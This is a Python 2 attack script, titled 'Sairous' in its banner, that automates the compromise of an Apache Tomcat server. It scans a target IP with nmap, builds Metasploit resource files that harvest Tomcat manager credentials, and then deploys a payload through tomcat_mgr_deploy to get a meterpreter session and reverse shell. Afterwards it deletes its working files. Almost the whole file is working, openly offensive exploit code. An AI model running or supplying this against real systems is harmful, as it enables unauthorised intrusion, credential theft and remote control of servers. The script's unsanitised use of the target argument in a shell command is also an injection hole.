import os,sys

def display_banner():
    os.system("clear")
    print ' _____          _'                        
    print '/ ____|        (_)'                       
    print '| (___    __ _  _  _ __  ___   _   _  ___'
    print " \___ \  / _` || || '__|/ _ \ | | | |/ __|"
    print " ____) || (_| || || |  | (_) || |_| |\__ \\"
    print '|_____/  \__,_||_||_|   \___/  \__,_||___/'
    print '\n',
    print '[*] This script consists of 5 steps.'
    print '\n',
    print '[*] 1. Discover the port the Tomcat server listens to..'
    print '[*] 2. Build the resource file to acquire username/pass'
    print '[*] 3. Run exploit #1...'
    print '[*] 4. Build the resource file to actually pwn the box...'
    print '[*] 5. $$$'
    raw_input('\n[*] Press any key to begin...')
    print '\n',

def getServicePort(ip):
	rport=None
	print "[*] Scanning started, this might take a while..."
	os.system("nmap -sV -Pn "+ip+" > /root/nmap.txt")
	print "[*] Scanning finished, checking for Tomcat..."
	f=open("/root/nmap.txt","r")
	for line in f.readlines():
		if "Tomcat" in line:
			rport=line.split("/")[0]
			print "[*] Found Tomcat at port",rport
	return rport

def build_rc1(ip,port):
	data='''spool /root/msfconsole.txt
use auxiliary/admin/http/tomcat_administration
set RHOSTS GHOST
set RPORT GPORT
exploit
exit'''
	data=data.replace("GHOST",ip)
	data=data.replace("GPORT",port)
	f=open("/root/rc1","w+")
	f.write(data)
	f.close()

def build_rc2(ip,port,user,passwd):
	data='''use exploit/multi/http/tomcat_mgr_deploy
setg RPORT GRPORT
setg RHOST GRHOST
set USERNAME GUSER
set PASSWORD GPASS
exploit'''
	data=data.replace("GRPORT",port)
	data=data.replace("GRHOST",ip)
	data=data.replace("GUSER",user)
	data=data.replace("GPASS",passwd)
	f=open("/root/rc2","w+")
	f.write(data)
	f.close()
def getUserPass():
	f=open("/root/msfconsole.txt","r")
	for line in f.readlines():
		if "http://" in line:
			line=line.split()[8]
			line=line.replace("/"," ")
			line=line.translate(None,"[]")
			line=line.split()
			return line[0],line[1]
	return None,None

def clean_the_mess():
	raw_input("[*] Press any key here AFTER you pwned the box...")
	os.remove("/root/rc1")
	os.remove("/root/rc2")
	os.remove("/root/nmap.txt")
	os.remove("/root/msfconsole.txt")

def main():
	display_banner() #self explanatory
	ip=sys.argv[1]
	port=getServicePort(ip) #also self explanatory
	if not port:
		print "[*] Not found..."
		return 0
	print "[*] Building rc1..."
	build_rc1(ip,port) #build the first resource file based on the template saved on that path.
	print "[*] Done..."
	print "[*] Running..."	
	os.system("gnome-terminal -x msfconsole -r /root/rc1 ; exit")
	raw_input("[*] Press any key to continue AFTER the 2nd window disappears...")
	print "[*] Extracting username and password..."
	user,passwd=getUserPass() # do i really need to explain this?
	if user and passwd:
		build_rc2(ip,port,user,passwd) #build the second resource file based on the template saved on that path.
		print "[*] Everything seems ok..."
		print "[*] Type shell to get reverse shell when meterpreter session is created..."
		raw_input("[*] Press any key to pwn...")
		os.system("gnome-terminal -x msfconsole -r /root/rc2")
	clean_the_mess()
	return 0

if __name__ == '__main__':
	main()

